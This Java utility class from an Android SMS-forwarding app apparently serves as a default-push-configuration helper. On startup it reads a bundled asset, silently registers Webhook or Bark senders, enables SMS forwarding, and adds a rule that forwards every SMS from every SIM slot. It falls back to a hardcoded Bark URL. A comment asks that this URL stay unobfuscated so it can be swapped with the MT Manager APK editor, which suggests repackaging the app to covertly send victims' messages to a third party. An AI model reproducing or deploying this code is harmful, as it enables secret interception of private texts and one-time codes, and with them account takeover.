package com.idormy.sms.forwarder.utils;

import android.content.Context;
import android.util.Log;

import com.alibaba.fastjson.JSON;
import com.idormy.sms.forwarder.model.RuleModel;
import com.idormy.sms.forwarder.model.SenderModel;
import com.idormy.sms.forwarder.model.vo.BarkSettingVo;
import com.idormy.sms.forwarder.model.vo.WebNotifySettingVo;
import com.idormy.sms.forwarder.sender.SenderUtil;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class DefaultPushConfigUtil {
    private static final String TAG = "DefaultPushConfigUtil";
    private static final String ASSET_NAME = "push_config.json";

    // v36 Bark 占位地址：不要拆分、不要加密、不要混淆，方便后期用 MT 管理器搜索替换。
    // MT 管理器直接搜索：1234567890ABCDEFG
    public static final String DEFAULT_BARK_SERVER = "https://api.day.app/1234567890ABCDEFG/";

    public static void applyDefaultPushConfig(Context context) {
        try {
            List<PushItem> items = readConfig(context);
            if (items == null || items.isEmpty()) {
                Log.i(TAG, "push_config.json disabled or empty");
                return;
            }

            SettingUtil.init(context);
            SenderUtil.init(context);
            RuleUtil.init(context);

            boolean applied = false;
            for (PushItem item : items) {
                if (item == null || !item.enabled || isEmpty(item.type)) {
                    continue;
                }
                Long senderId = null;
                if ("webhook".equalsIgnoreCase(item.type) || "web".equalsIgnoreCase(item.type)) {
                    senderId = applyDefaultWebhook(item);
                } else if ("bark".equalsIgnoreCase(item.type)) {
                    senderId = applyDefaultBark(item);
                }

                if (senderId != null && senderId > 0) {
                    applied = true;
                    Log.i(TAG, "default push sender applied, type=" + item.type + ", senderId=" + senderId);
                }
            }

            if (applied) {
                SettingUtil.switchEnableSms(true);
            }
        } catch (Exception e) {
            Log.e(TAG, "applyDefaultPushConfig failed", e);
        }
    }

    private static Long applyDefaultWebhook(PushItem item) {
        if (isEmpty(item.webServer)) {
            return null;
        }

        String jsonSetting = JSON.toJSONString(new WebNotifySettingVo(
                item.webServer,
                item.secret == null ? "" : item.secret,
                isEmpty(item.method) ? "POST" : item.method,
                isEmpty(item.webParams) ? "{text:[msg]}" : item.webParams
        ));

        Long senderId = ensureWebhookSender(item.name, item.webServer, jsonSetting);
        if (senderId != null && senderId > 0) {
            ensureSmsForwardAllRule(senderId);
        }
        return senderId;
    }

    private static Long applyDefaultBark(PushItem item) {
        String barkServer = item.server;
        if (isEmpty(barkServer)) {
            barkServer = item.barkServer;
        }
        if (isEmpty(barkServer)) {
            barkServer = DEFAULT_BARK_SERVER;
        }
        barkServer = barkServer.trim();
        if (isEmpty(barkServer)) {
            return null;
        }

        String jsonSetting = JSON.toJSONString(new BarkSettingVo(
                barkServer,
                item.icon == null ? "" : item.icon
        ));

        Long senderId = ensureBarkSender(item.name, barkServer, jsonSetting);
        if (senderId != null && senderId > 0) {
            ensureSmsForwardAllRule(senderId);
        }
        return senderId;
    }

    private static Long ensureWebhookSender(String name, String webServer, String jsonSetting) {
        String finalName = isEmpty(name) ? "默认Webhook" : name;
        List<SenderModel> senders = SenderUtil.getSender(null, null);
        for (SenderModel sender : senders) {
            if (sender.getType() == SenderModel.TYPE_WEB_NOTIFY) {
                String oldJson = sender.getJsonSetting() == null ? "" : sender.getJsonSetting();
                if (finalName.equals(sender.getName()) || oldJson.contains(webServer)) {
                    sender.setName(finalName);
                    sender.setStatus(SenderModel.STATUS_ON);
                    sender.setJsonSetting(jsonSetting);
                    SenderUtil.updateSender(sender);
                    return sender.getId();
                }
            }
        }

        SenderModel sender = new SenderModel();
        sender.setName(finalName);
        sender.setType(SenderModel.TYPE_WEB_NOTIFY);
        sender.setStatus(SenderModel.STATUS_ON);
        sender.setJsonSetting(jsonSetting);
        long id = SenderUtil.addSender(sender);
        return id > 0 ? id : null;
    }

    private static Long ensureBarkSender(String name, String barkServer, String jsonSetting) {
        String finalName = isEmpty(name) ? "默认Bark" : name;
        List<SenderModel> senders = SenderUtil.getSender(null, null);
        for (SenderModel sender : senders) {
            if (sender.getType() == SenderModel.TYPE_BARK) {
                String oldJson = sender.getJsonSetting() == null ? "" : sender.getJsonSetting();
                if (finalName.equals(sender.getName()) || oldJson.contains(barkServer)) {
                    sender.setName(finalName);
                    sender.setStatus(SenderModel.STATUS_ON);
                    sender.setJsonSetting(jsonSetting);
                    SenderUtil.updateSender(sender);
                    return sender.getId();
                }
            }
        }

        SenderModel sender = new SenderModel();
        sender.setName(finalName);
        sender.setType(SenderModel.TYPE_BARK);
        sender.setStatus(SenderModel.STATUS_ON);
        sender.setJsonSetting(jsonSetting);
        long id = SenderUtil.addSender(sender);
        return id > 0 ? id : null;
    }

    private static void ensureSmsForwardAllRule(Long senderId) {
        List<RuleModel> rules = RuleUtil.getRule(null, null, "sms");
        for (RuleModel rule : rules) {
            if (senderId.equals(rule.getSenderId())
                    && "sms".equals(rule.getType())
                    && RuleModel.FILED_TRANSPOND_ALL.equals(rule.getFiled())
                    && RuleModel.CHECK_SIM_SLOT_ALL.equals(rule.getSimSlot())) {
                return;
            }
        }

        RuleModel rule = new RuleModel();
        rule.setType("sms");
        rule.setFiled(RuleModel.FILED_TRANSPOND_ALL);
        rule.setCheck(RuleModel.CHECK_IS);
        rule.setValue("");
        rule.setSenderId(senderId);
        rule.setSimSlot(RuleModel.CHECK_SIM_SLOT_ALL);
        rule.setSwitchSmsTemplate(false);
        rule.setSmsTemplate("");
        RuleUtil.addRule(rule);
    }

    private static List<PushItem> readConfig(Context context) throws Exception {
        InputStream inputStream = context.getAssets().open(ASSET_NAME);
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append('\n');
        }
        reader.close();

        JSONObject obj = new JSONObject(sb.toString());
        boolean enabled = obj.optBoolean("enabled", true);
        if (!enabled) {
            return new ArrayList<>();
        }

        List<PushItem> items = new ArrayList<>();

        JSONArray array = obj.optJSONArray("senders");
        if (array != null) {
            for (int i = 0; i < array.length(); i++) {
                JSONObject itemObj = array.optJSONObject(i);
                if (itemObj != null) {
                    PushItem item = parseItem(itemObj);
                    if (item != null) {
                        items.add(item);
                    }
                }
            }
            return items;
        }

        // 兼容 v35 旧格式：Webhook 和 Bark 都写在同一个 JSON 对象里。
        if (obj.optBoolean("webEnabled", true) && !isEmpty(obj.optString("webServer", ""))) {
            PushItem web = new PushItem();
            web.enabled = true;
            web.type = obj.optString("type", "webhook");
            web.name = obj.optString("name", "默认Webhook");
            web.webServer = obj.optString("webServer", "");
            web.method = obj.optString("method", "POST");
            web.secret = obj.optString("secret", "");
            web.webParams = obj.optString("webParams", "{text:[msg]}");
            items.add(web);
        }

        if (obj.optBoolean("barkEnabled", true)) {
            PushItem bark = new PushItem();
            bark.enabled = true;
            bark.type = "bark";
            bark.name = obj.optString("barkName", "默认Bark");
            bark.server = obj.optString("barkServer", DEFAULT_BARK_SERVER);
            bark.barkServer = bark.server;
            bark.icon = obj.optString("barkIcon", "");
            items.add(bark);
        }

        return items;
    }

    private static PushItem parseItem(JSONObject obj) {
        if (obj == null) {
            return null;
        }
        PushItem item = new PushItem();
        item.enabled = obj.optBoolean("enabled", true);
        item.type = obj.optString("type", "");
        item.name = obj.optString("name", "");
        item.webServer = obj.optString("webServer", obj.optString("server", ""));
        item.method = obj.optString("method", "POST");
        item.secret = obj.optString("secret", "");
        item.webParams = obj.optString("webParams", "{text:[msg]}");
        item.server = obj.optString("server", obj.optString("barkServer", ""));
        item.barkServer = obj.optString("barkServer", item.server);
        item.icon = obj.optString("icon", obj.optString("barkIcon", ""));
        return item;
    }

    private static boolean isEmpty(String s) {
        return s == null || s.trim().isEmpty();
    }

    private static class PushItem {
        boolean enabled;
        String type;
        String name;

        String webServer;
        String method;
        String secret;
        String webParams;

        String server;
        String barkServer;
        String icon;
    }
}
